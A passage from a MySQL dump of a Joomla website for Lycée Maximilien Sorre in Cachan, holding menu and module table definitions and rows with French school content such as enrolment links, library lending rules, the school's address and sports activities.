85, 0, '*', 0),
(135, 'mainmenu', 'Réglement Intérieur', 'lycee-reglement', '', 'lycee/lycee-reglement', 'index.php?option=com_content&view=category&layout=blog&id=38', 'component', 1, 104, 2, 22, 0, 0, '0000-00-00 00:00:00', 0, 1, '', 0, '{"layout_type":"blog","show_category_heading_title_text":"","show_category_title":"","show_description":"","show_description_image":"","maxLevel":"","show_empty_categories":"","show_no_articles":"","show_subcat_desc":"","show_cat_num_articles":"","page_subheading":"","num_leading_articles":"","num_intro_articles":"","num_columns":"","num_links":"","multi_column_order":"","show_subcategory_content":"","orderby_pri":"","orderby_sec":"","order_date":"","show_pagination":"","show_pagination_results":"","show_title":"","link_titles":"","show_intro":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_vote":"","show_readmore":"","show_readmore_title":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_hits":"","show_noauth":"","show_feed_link":"","feed_summary":"","menu-anchor_title":"","menu-anchor_css":"","menu_image":"","menu_text":1,"page_title":"","show_page_heading":0,"page_heading":"","pageclass_sfx":"","menu-meta_description":"","menu-meta_keywords":"","robots":"","secure":0}', 60, 61, 0, '*', 0),
(142, 'mainmenu', 'Foyer Socio-Educatif', 'vie-scol-fse', '', 'vie-scolaire/vie-scol-fse', 'index.php?option=com_content&view=category&layout=blog&id=41', 'component', 1, 133, 2, 22, 0, 0, '0000-00-00 00:00:00', 0, 1, '', 0, '{"layout_type":"blog","show_category_heading_title_text":"","show_category_title":"","show_description":"","show_description_image":"","maxLevel":"","show_empty_categories":"","show_no_articles":"","show_subcat_desc":"","show_cat_num_articles":"","page_subheading":"","num_leading_articles":"","num_intro_articles":"","num_columns":"","num_links":"","multi_column_order":"","show_subcategory_content":"","orderby_pri":"","orderby_sec":"","order_date":"","show_pagination":"","show_pagination_results":"","show_title":"","link_titles":"","show_intro":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_vote":"","show_readmore":"","show_readmore_title":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_hits":"","show_noauth":"","show_feed_link":"","feed_summary":"","menu-anchor_title":"","menu-anchor_css":"","menu_image":"","menu_text":1,"page_title":"","show_page_heading":0,"page_heading":"","pageclass_sfx":"","menu-meta_description":"","menu-meta_keywords":"","robots":"","secure":0}', 78, 79, 0, '*', 0),
(136, 'mainmenu', 'Autres formations', 'form-autres', '', 'formations/form-autres', 'index.php?option=com_content&view=category&layout=blog&id=26', 'component', 1, 103, 2, 22, 0, 0, '0000-00-00 00:00:00', 0, 1, '', 0, '{"layout_type":"blog","show_category_heading_title_text":"","show_category_title":"","show_description":"","show_description_image":"","maxLevel":"","show_empty_categories":"","show_no_articles":"","show_subcat_desc":"","show_cat_num_articles":"","page_subheading":"","num_leading_articles":"","num_intro_articles":"","num_columns":"","num_links":"","multi_column_order":"","show_subcategory_content":"","orderby_pri":"","orderby_sec":"","order_date":"","show_pagination":"","show_pagination_results":"","show_title":"","link_titles":"","show_intro":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_vote":"","show_readmore":"","show_readmore_title":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_hits":"","show_noauth":"","show_feed_link":"","feed_summary":"","menu-anchor_title":"","menu-anchor_css":"","menu_image":"","menu_text":1,"page_title":"","show_page_heading":0,"page_heading":"","pageclass_sfx":"","menu-meta_description":"","menu-meta_keywords":"","robots":"","secure":0}', 70, 71, 0, '*', 0),
(137, 'mainmenu', 'Orientation', 'form-orientation', '', 'formations/form-orientation', 'index.php?option=com_content&view=category&layout=blog&id=32', 'component', 1, 103, 2, 22, 0, 0, '0000-00-00 00:00:00', 0, 1, '', 0, '{"layout_type":"blog","show_category_heading_title_text":"","show_category_title":"","show_description":"","show_description_image":"","maxLevel":"","show_empty_categories":"","show_no_articles":"","show_subcat_desc":"","show_cat_num_articles":"","page_subheading":"","num_leading_articles":"","num_intro_articles":"","num_columns":"","num_links":"","multi_column_order":"","show_subcategory_content":"","orderby_pri":"","orderby_sec":"","order_date":"","show_pagination":"","show_pagination_results":"","show_title":"","link_titles":"","show_intro":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_vote":"","show_readmore":"","show_readmore_title":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_hits":"","show_noauth":"","show_feed_link":"","feed_summary":"","menu-anchor_title":"","menu-anchor_css":"","menu_image":"","menu_text":1,"page_title":"","show_page_heading":0,"page_heading":"","pageclass_sfx":"","menu-meta_description":"","menu-meta_keywords":"","robots":"","secure":0}', 72, 73, 0, '*', 0),
(138, 'mainmenu', 'Scolarité', 'vie-scol-scolarite', '', 'vie-scolaire/vie-scol-scolarite', 'index.php?option=com_content&view=category&layout=blog&id=40', 'component', 1, 133, 2, 22, 0, 0, '0000-00-00 00:00:00', 0, 1, '', 0, '{"layout_type":"blog","show_category_heading_title_text":"","show_category_title":"","show_description":"","show_description_image":"","maxLevel":"","show_empty_categories":"","show_no_articles":"","show_subcat_desc":"","show_cat_num_articles":"","page_subheading":"","num_leading_articles":"","num_intro_articles":"","num_columns":"","num_links":"","multi_column_order":"","show_subcategory_content":"","orderby_pri":"","orderby_sec":"","order_date":"","show_pagination":"","show_pagination_results":"","show_title":"","link_titles":"","show_intro":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_vote":"","show_readmore":"","show_readmore_title":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_hits":"","show_noauth":"","show_feed_link":"","feed_summary":"","menu-anchor_title":"","menu-anchor_css":"","menu_image":"","menu_text":1,"page_title":"","show_page_heading":0,"page_heading":"","pageclass_sfx":"","menu-meta_description":"","menu-meta_keywords":"","robots":"","secure":0}', 76, 77, 0, '*', 0),
(139, 'mainmenu', 'Restauration', 'vie-scol-restauration', '', 'vie-scolaire/vie-scol-restauration', 'index.php?option=com_content&view=category&layout=blog&id=39', 'component', 1, 133, 2, 22, 0, 0, '0000-00-00 00:00:00', 0, 1, '', 0, '{"layout_type":"blog","show_category_heading_title_text":"","show_category_title":"","show_description":"","show_description_image":"","maxLevel":"","show_empty_categories":"","show_no_articles":"","show_subcat_desc":"","show_cat_num_articles":"","page_subheading":"","num_leading_articles":"","num_intro_articles":"","num_columns":"","num_links":"","multi_column_order":"","show_subcategory_content":"","orderby_pri":"","orderby_sec":"","order_date":"","show_pagination":"","show_pagination_results":"","show_title":"","link_titles":"","show_intro":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_vote":"","show_readmore":"","show_readmore_title":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_hits":"","show_noauth":"","show_feed_link":"","feed_summary":"","menu-anchor_title":"","menu-anchor_css":"","menu_image":"","menu_text":1,"page_title":"","show_page_heading":0,"page_heading":"","pageclass_sfx":"","menu-meta_description":"","menu-meta_keywords":"","robots":"","secure":0}', 80, 81, 0, '*', 0),
(140, 'mainmenu', 'Conseil de la Vie Lycéenne', 'vie-scol-cvl', '', 'vie-scolaire/vie-scol-cvl', 'index.php?option=com_content&view=category&layout=blog&id=37', 'component', 1, 133, 2, 22, 0, 0, '0000-00-00 00:00:00', 0, 1, '', 0, '{"layout_type":"blog","show_category_heading_title_text":"","show_category_title":"","show_description":"","show_description_image":"","maxLevel":"","show_empty_categories":"","show_no_articles":"","show_subcat_desc":"","show_cat_num_articles":"","page_subheading":"","num_leading_articles":"","num_intro_articles":"","num_columns":"","num_links":"","multi_column_order":"","show_subcategory_content":"","orderby_pri":"","orderby_sec":"","order_date":"","show_pagination":"","show_pagination_results":"","show_title":"","link_titles":"","show_intro":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_vote":"","show_readmore":"","show_readmore_title":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_hits":"","show_noauth":"","show_feed_link":"","feed_summary":"","menu-anchor_title":"","menu-anchor_css":"","menu_image":"","menu_text":1,"page_title":"","show_page_heading":0,"page_heading":"","pageclass_sfx":"","menu-meta_description":"","menu-meta_keywords":"","robots":"","secure":0}', 86, 87, 0, '*', 0),
(141, 'mainmenu', 'Association des Parents d''Élèves', 'vie-scol-ape', '', 'vie-scolaire/vie-scol-ape', 'index.php?option=com_content&view=category&layout=blog&id=36', 'component', 1, 133, 2, 22, 0, 0, '0000-00-00 00:00:00', 0, 1, '', 0, '{"layout_type":"blog","show_category_heading_title_text":"","show_category_title":"","show_description":"","show_description_image":"","maxLevel":"","show_empty_categories":"","show_no_articles":"","show_subcat_desc":"","show_cat_num_articles":"","page_subheading":"","num_leading_articles":"","num_intro_articles":"","num_columns":"","num_links":"","multi_column_order":"","show_subcategory_content":"","orderby_pri":"","orderby_sec":"","order_date":"","show_pagination":"","show_pagination_results":"","show_title":"","link_titles":"","show_intro":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_vote":"","show_readmore":"","show_readmore_title":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_hits":"","show_noauth":"","show_feed_link":"","feed_summary":"","menu-anchor_title":"","menu-anchor_css":"","menu_image":"","menu_text":1,"page_title":"","show_page_heading":0,"page_heading":"","pageclass_sfx":"","menu-meta_description":"","menu-meta_keywords":"","robots":"","secure":0}', 88, 89, 0, '*', 0);

-- --------------------------------------------------------

--
-- Table structure for table `jos_menu_types`
--

CREATE TABLE IF NOT EXISTS `jos_menu_types` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `menutype` varchar(24) NOT NULL,
  `title` varchar(48) NOT NULL,
  `description` varchar(255) NOT NULL DEFAULT '',
  PRIMARY KEY (`id`),
  UNIQUE KEY `idx_menutype` (`menutype`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=3 ;

--
-- Dumping data for table `jos_menu_types`
--

INSERT INTO `jos_menu_types` (`id`, `menutype`, `title`, `description`) VALUES
(1, 'mainmenu', 'Main Menu', 'The main menu for the site');

-- --------------------------------------------------------

--
-- Table structure for table `jos_messages`
--

CREATE TABLE IF NOT EXISTS `jos_messages` (
  `message_id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `user_id_from` int(10) unsigned NOT NULL DEFAULT '0',
  `user_id_to` int(10) unsigned NOT NULL DEFAULT '0',
  `folder_id` tinyint(3) unsigned NOT NULL DEFAULT '0',
  `date_time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `state` tinyint(1) NOT NULL DEFAULT '0',
  `priority` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `subject` varchar(255) NOT NULL DEFAULT '',
  `message` text NOT NULL,
  PRIMARY KEY (`message_id`),
  KEY `useridto_state` (`user_id_to`,`state`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Table structure for table `jos_messages_cfg`
--

CREATE TABLE IF NOT EXISTS `jos_messages_cfg` (
  `user_id` int(10) unsigned NOT NULL DEFAULT '0',
  `cfg_name` varchar(100) NOT NULL DEFAULT '',
  `cfg_value` varchar(255) NOT NULL DEFAULT '',
  UNIQUE KEY `idx_user_var_name` (`user_id`,`cfg_name`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `jos_modules`
--

CREATE TABLE IF NOT EXISTS `jos_modules` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `title` varchar(100) NOT NULL DEFAULT '',
  `note` varchar(255) NOT NULL DEFAULT '',
  `content` text NOT NULL,
  `ordering` int(11) NOT NULL DEFAULT '0',
  `position` varchar(50) NOT NULL DEFAULT '',
  `checked_out` int(10) unsigned NOT NULL DEFAULT '0',
  `checked_out_time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `publish_up` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `publish_down` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `published` tinyint(1) NOT NULL DEFAULT '0',
  `module` varchar(50) DEFAULT NULL,
  `access` int(10) unsigned DEFAULT NULL,
  `showtitle` tinyint(3) unsigned NOT NULL DEFAULT '1',
  `params` text NOT NULL,
  `client_id` tinyint(4) NOT NULL DEFAULT '0',
  `language` char(7) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `published` (`published`,`access`),
  KEY `newsfeeds` (`module`,`published`),
  KEY `idx_language` (`language`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=59 ;

--
-- Dumping data for table `jos_modules`
--

INSERT INTO `jos_modules` (`id`, `title`, `note`, `content`, `ordering`, `position`, `checked_out`, `checked_out_time`, `publish_up`, `publish_down`, `published`, `module`, `access`, `showtitle`, `params`, `client_id`, `language`) VALUES
(1, 'Main Menu', '', '', 1, 'top', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 1, 'mod_menu', 1, 1, '{"menutype":"mainmenu","startLevel":"1","endLevel":"0","showAllChildren":"1","tag_id":"","class_sfx":"","window_open":"","layout":"_:default","moduleclass_sfx":"_menu","cache":"1","cache_time":"900","cachemode":"itemid"}', 0, '*'),
(2, 'Login', '', '', 1, 'login', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 1, 'mod_login', 1, 1, '', 1, '*'),
(3, 'Popular Articles', '', '', 3, 'cpanel', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 1, 'mod_popular', 3, 1, '{"count":"5","catid":"","user_id":"0","layout":"_:default","moduleclass_sfx":"","cache":"0","automatic_title":"1"}', 1, '*'),
(4, 'Recently Added Articles', '', '', 4, 'cpanel', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 1, 'mod_latest', 3, 1, '{"count":"5","ordering":"c_dsc","catid":"","user_id":"0","layout":"_:default","moduleclass_sfx":"","cache":"0","automatic_title":"1"}', 1, '*'),
(6, 'Unread Messages', '', '', 1, 'header', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 1, 'mod_unread', 3, 1, '', 1, '*'),
(7, 'Online Users', '', '', 2, 'header', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 1, 'mod_online', 3, 1, '', 1, '*'),
(8, 'Toolbar', '', '', 1, 'toolbar', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 1, 'mod_toolbar', 3, 1, '', 1, '*'),
(9, 'Quick Icons', '', '', 1, 'icon', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 1, 'mod_quickicon', 3, 1, '', 1, '*'),
(10, 'Logged-in Users', '', '', 2, 'cpanel', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 1, 'mod_logged', 3, 1, '{"count":"5","name":"1","layout":"_:default","moduleclass_sfx":"","cache":"0","automatic_title":"1"}', 1, '*'),
(12, 'Admin Menu', '', '', 1, 'menu', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 1, 'mod_menu', 3, 1, '{"layout":"","moduleclass_sfx":"","shownew":"1","showhelp":"1","cache":"0"}', 1, '*'),
(13, 'Admin Submenu', '', '', 1, 'submenu', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 1, 'mod_submenu', 3, 1, '', 1, '*'),
(14, 'User Status', '', '', 2, 'status', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 1, 'mod_status', 3, 1, '', 1, '*'),
(15, 'Title', '', '', 1, 'title', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 1, 'mod_title', 3, 1, '', 1, '*'),
(16, 'Login Form', '', '', 1, 'right', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', -2, 'mod_login', 1, 1, '{"pretext":"","posttext":"","login":"","logout":"","greeting":"1","name":"0","usesecure":"0","layout":"_:default","moduleclass_sfx":"","cache":"0"}', 0, '*'),
(17, 'Breadcrumbs', '', '', 1, 'position-2', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', -2, 'mod_breadcrumbs', 1, 1, '{"moduleclass_sfx":"","showHome":"1","homeText":"Home","showComponent":"1","separator":"","cache":"1","cache_time":"900","cachemode":"itemid"}', 0, '*'),
(18, 'Slider Accueil', '', '', 1, 'slider', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 1, 'mod_banners', 1, 1, '{"target":"0","count":"6","cid":"0","catid":["50"],"tag_search":"0","ordering":"0","header_text":"","footer_text":"","layout":"_:default","moduleclass_sfx":"","cache":"1","cache_time":"900"}', 0, '*'),
(19, 'Footer Menu', '', '', 1, 'footer', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 1, 'mod_menu', 1, 1, '{"menutype":"mainmenu","startLevel":"1","endLevel":"1","showAllChildren":"0","tag_id":"","class_sfx":"","window_open":"","layout":"_:default","moduleclass_sfx":"","cache":"1","cache_time":"900","cachemode":"itemid"}', 0, '*'),
(20, 'Footer', '', '', 2, 'footer', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 1, 'mod_footer', 1, 1, '{"layout":"_:default","moduleclass_sfx":"","cache":"1","cache_time":"900","cachemode":"static"}', 0, '*'),
(21, 'Staff Profile', '', '<p><img src="images/page2-img2.jpg" alt="2" /></p>\r\n\r\n<p><strong>Lorem ipsum dolor sitem amet </strong></p>\r\n\r\n<p>Consectetuer adipiscing elit praesent vestibulum molestie lacus. Aeneanum nonummy hendrerit mauris. Phasellus porta. Fusce suscipit varius mi. Cume sociis natoque penatibus etun magnis dis parturient montesascetur ridiculus mus. Nulla dui. Fusce feugiat.</p>\r\n\r\n<p>Malesuada odio. Morbi nunc odiomen gravida at, cursus nec, luctus a lorem maecenas tristique orci ac sem. Duis ultricies pharetra magna onec accumsan malesuada orci. Donec site amet eros. Lorem ipsum dolor sitemet amet Mauris fermentum dictum magna. Sed laoreet aliquam leo. Ut tellus.</p>\r\n\r\n<a class="readmore" href="#">Read More</a>', 1, 'right', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', -2, 'mod_custom', 1, 1, '{"prepare_content":"1","backgroundimage":"","layout":"_:default","moduleclass_sfx":" red","cache":"1","cache_time":"900","cachemode":"static"}', 0, '*'),
(22, 'Inscription', '', '<p>Pour s''inscrire, il suffit de suivre la procédure de la formation qui vous intéresse :</p>\r\n<ul class="art-list">\r\n<li><small><span style="font-size: small;"><small><a href="40-pre-bac-seconde-premiere-et-terminale">Pré-Bac (seconde, première et terminale)</a></small></span></small></li>\r\n<li><a href="#"><small></small></a><small><span style="font-size: small;"><small><a href="41-seconde-homogene">Seconde homogène</a></small></span></small></li>\r\n<li><a href="#"><small></small></a><small><span style="font-size: small;"><small><a href="42-bts-cpge-dcg">BTS, CPGE, DCG</a></small></span></small></li>\r\n<li><a href="#"><small></small></a><small><span style="font-size: small;"><small><a href="43-dcg-2eme-et-3eme-annee">DCG 2ème et 3ème année</a></small></span></small></li>\r\n<li><small><span style="font-size: small;"><small><a href="44-conseilleres-en-esf">Conseillères en ESF</a></small></span></small></li>\r\n</ul>\r\n<p>Nous vous conseillons de vous y prendre tôt à l''avance. N''hésitez pas à nous contacter à partir de la section contact.</p>', 1, 'left', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', -2, 'mod_custom', 1, 1, '{"prepare_content":"1","backgroundimage":"","layout":"_:default","moduleclass_sfx":" green","cache":"1","cache_time":"900","cachemode":"static"}', 0, '*'),
(23, 'Maximilien Sorre ', '', '<p align="center"><img src="http://www.lms.ens-cachan.fr/max_sorre.jpg" border="0" width="168" height="193" /></p>\r\n<p><strong><span><span>1880 - 1962</span></span></strong></p>\r\n<p>Ancien élève de l''École Normale Supérieure de Saint-Cloud, il devient Docteur ès Lettres en 1913 avec une thèse de Géographie biologique sur les Pyrénées méditerranéennes.</p>\r\n<p>Professeur de Faculté, recteur de l''académie de Clermont-Ferrand puis de celle d''Aix Marseille, Directeur de l''Enseignement du Premier degré de 1937 à 1940, il enseigne ensuite à l''université de Montpellier puis à la Sorbonne (1941-1948).</p>\r\n<p>Auteur d''un ouvrage de synthèse sur les Pyrénées (1928), puis sur les migrations des peuples (1955), il a collaboré à la Géographie universelle, en particulier sur le Mexique, l''Amérique Centrale (1934), la Méditerranée et les Péninsules méditerranéennes. Son traité <span style="font-style: italic;">Les fondements de la Géographie humaine</span> fait autorité.</p>', 1, 'right', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', -2, 'mod_custom', 1, 1, '{"prepare_content":"1","backgroundimage":"","layout":"_:default","moduleclass_sfx":" orange","cache":"1","cache_time":"900","cachemode":"static"}', 0, '*'),
(24, 'Curriculum', '', '<p>Consectetuer adipiscing elit praesent vestibulum molestie lacus. Aeneanum nonummy hendrerit mauris. Phasellus porta. Fusce suscipit varius mi. Cume sociis natoque penatibus etun magnis dis parturient montesascetur ridiculus mus. Nulla dui. Fusce feugiat.</p>\r\n<ul class="art-list">\r\n<li><a href="#">Praesent vestibulum molet tie lacus lorem</a></li>\r\n<li><a href="#">vestibulum molestie</a></li>\r\n<li><a href="#">Vestibulum iaculis lacin</a></li>\r\n<li><a href="#">Sed ut perspiciatis unde</a></li>\r\n<li><a href="#">nostrum exercitationem</a></li>\r\n<li><a href="#">voluptatem accusantium</a></li>\r\n</ul>\r\n<p><a class="readmore" href="#">Read More</a></p>', 1, 'left', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', -2, 'mod_custom', 1, 1, '{"prepare_content":"1","backgroundimage":"","layout":"_:default","moduleclass_sfx":" red","cache":"1","cache_time":"900","cachemode":"static"}', 0, '*'),
(25, 'Standard', '', '<p>Lycée Maximilien Sorre <br /> 61, avenue du président Wilson <br />94235 CACHAN CEDEX</p>\r\n<p>Tel: 01 47 40 49 60 <br /> Fax: 01 46 64 92 72</p>\r\n<p>Pour contacter un service en particulier, rendez-vous sur <a href="39-administration">la page administration</a>.</p>', 1, 'right', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', -2, 'mod_custom', 1, 1, '{"prepare_content":"1","backgroundimage":"","layout":"_:default","moduleclass_sfx":" red","cache":"1","cache_time":"900","cachemode":"static"}', 0, '*'),
(26, 'Google Map', '', '&nbsp;', 1, 'right', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', -2, 'mod_custom', 1, 0, '{"prepare_content":"1","backgroundimage":"","layout":"theme777:map","moduleclass_sfx":"","cache":"1","cache_time":"900","cachemode":"static"}', 0, '*'),
(27, 'Search', '', '', 1, 'right', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', -2, 'mod_search', 1, 1, '{"label":"","width":"20","text":"","button":"1","button_pos":"bottom","imagebutton":"","button_text":"Search","opensearch":"1","opensearch_title":"","set_itemid":"","layout":"_:default","moduleclass_sfx":"","cache":"1","cache_time":"900","cachemode":"itemid"}', 0, '*'),
(28, 'Page2-banner', '', '<img src="images/header-img_2.jpg" alt="2" />', 1, 'slider', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', -2, 'mod_custom', 1, 1, '{"prepare_content":"1","backgroundimage":"","layout":"_:default","moduleclass_sfx":"","cache":"1","cache_time":"900","cachemode":"static"}', 0, '*'),
(29, 'banniere-formation', '', '<p><img src="images/banniere23.jpg" border="0" alt="" /></p>', 1, 'slider', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', -2, 'mod_custom', 1, 1, '{"prepare_content":"1","backgroundimage":"","layout":"_:default","moduleclass_sfx":"","cache":"1","cache_time":"900","cachemode":"static"}', 0, '*'),
(30, 'Page4-banner', '', '<p><img src="images/260320121464.jpg" border="0" alt="" /></p>', 1, 'slider', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', -2, 'mod_custom', 1, 1, '{"prepare_content":"1","backgroundimage":"","layout":"_:default","moduleclass_sfx":"","cache":"1","cache_time":"900","cachemode":"static"}', 0, '*'),
(31, 'Page5-banner', '', '<p><img src="images/260320121460.jpg" border="0" alt="" /></p>', 1, 'slider', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', -2, 'mod_custom', 1, 1, '{"prepare_content":"1","backgroundimage":"","layout":"_:default","moduleclass_sfx":"","cache":"1","cache_time":"900","cachemode":"static"}', 0, '*'),
(32, 'bannière contact', '', '<p><img src="images/260320121472.jpg" border="0" alt="" /></p>', 1, 'slider', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', -2, 'mod_custom', 1, 1, '{"prepare_content":"1","backgroundimage":"","layout":"_:default","moduleclass_sfx":"","cache":"1","cache_time":"900","cachemode":"static"}', 0, '*'),
(33, 'Page7-banner', '', '<img src="images/header_img7.jpg" alt="7" />', 1, 'slider', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', -2, 'mod_custom', 1, 1, '{"prepare_content":"1","backgroundimage":"","layout":"_:default","moduleclass_sfx":"","cache":"1","cache_time":"900","cachemode":"static"}', 0, '*'),
(34, 'DisplayNews', '', '', 0, '', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', -2, 'mod_dn', 1, 1, '', 0, '*'),
(39, 'bannière contact (copie)', '', '<p><img src="images/260320121472.jpg" border="0" alt="" /></p>', 1, 'slider', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', -2, 'mod_custom', 1, 1, '{"prepare_content":"1","backgroundimage":"","layout":"_:default","moduleclass_sfx":"","cache":"1","cache_time":"900","cachemode":"static"}', 0, '*'),
(35, 'Prêts et liens', '', '<p><strong>Prêts</strong></p>\r\n<p>Les romans, les documentaires, les périodiques (sauf les numéros du mois en cours) sont prêtés pour une durée de <span style="font-weight: bold;">3 semaines</span> sur présentation de votre carte de lycéen ou d’étudiant.</p>\r\n<p><span> Nombre de maximal d’ouvrages empruntés : <span style="font-weight: bold;">3</span>. Les usuels ne sont pas prêtés, ni les documents de l’ONISEP ou du CIDJ.</span></p>\r\n<p><br /><strong><span> Actuel-cidj.info<br /> </span></strong></p>\r\n<p><a href="http://www.actuel-cidj.info/" target="_blank"><img src="http://www.lms.ens-cachan.fr/images/cidj.gif" border="0" width="136" height="67" /></a></p>\r\n<p><span>Information des jeunes : études, stages en entreprise et jobs d''été, bourses, logement étudiant, sejours linguistiques, aide à l’orientation scolaire et professionnelle.</span><br /> Accessible uniquement sur les postes du lycée.</p>\r\n<p align="left"><strong>Les métiers.net<br /></strong></p>\r\n<p align="left"><span><strong><a href="http://www.lesmetiers.net/" target="_blank"><img src="http://www.lms.ens-cachan.fr/images/image-12112-metiers.jpg" border="0" width="103" height="72" /></a></strong></span></p>\r\n<p><span>Choisir sa formation, son orientation ou choisir son métier : LesMetiers.net vous informe sur les métiers et les formations en</span> <span>Ile-de-France</span></p>\r\n<p align="left"> </p>', 1, 'right', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', -2, 'mod_custom', 1, 1, '{"prepare_content":"1","backgroundimage":"","layout":"_:default","moduleclass_sfx":" orange","cache":"1","cache_time":"900","cachemode":"static"}', 0, '*'),
(36, 'Banner-CDI', '', '<p><img src="images/260320121464.jpg" border="0" alt="" /></p>', 1, 'slider', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', -2, 'mod_custom', 1, 1, '{"prepare_content":"1","backgroundimage":"","layout":"_:default","moduleclass_sfx":"","cache":"1","cache_time":"900","cachemode":"static"}', 0, '*'),
(37, 'Association sportive', '', '<p style="color: #000000;">L''association sportive propose aux élèves du lycée, les activités suivantes :<br /> <br /> <span style="font-style: italic;"> Natation</span></p>\r\n<p style="font-style: italic; color: #000000;">Volley-ball</p>\r\n<p style="font-style: italic; color: #000000;">Tennis</p>\r\n<p style="font-style: italic; color: #000000;">Musculation</p>\r\n<p style="font-style: italic; color: #000000;">Badminton</p>\r\n<p style="font-style: italic; color: #000000;">Foot en salle</p>\r\n<p style="font-style: italic; color: #000000;">Basket ball</p>\r\n<p style="font-style: italic; color: #000000;">Tennis de table</p>\r\n<p style="color: #000000;"><br /> Les activités et compétitions ont lieu le mercredi après-midi à partir de 12h30, la natation de 12h30 à 13h30.</p>\r\n<p style="color: #000000;"> </p>\r\n<p style="color: #000000;"> </p>\r\n<p style="color: #000000;"><strong>Natation</strong></p>\r\n<p style="color: #000000;">Participation assidue des élèves inscrits. L''entraînement est basé essentiellement sur un approfondissement de la technique individuelle et une préparation aux différents examens (option bac, concours professorat 